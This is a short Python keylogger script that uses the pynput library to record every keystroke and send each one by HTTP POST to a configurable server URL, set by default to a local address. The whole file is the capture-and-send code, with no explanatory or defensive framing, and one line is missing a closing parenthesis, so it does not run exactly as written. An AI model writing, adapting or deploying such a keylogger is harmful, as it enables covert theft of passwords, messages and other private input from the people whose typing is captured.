import requests, json
from pynput import keyboard

url = 'http://127.0.0.1:5000/'  #configure the url

def on_press(key):
    try:
        requests.post(url, data=key.char)
    except AttributeError:
        requests.post(url, data='{0}'.format(key)

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
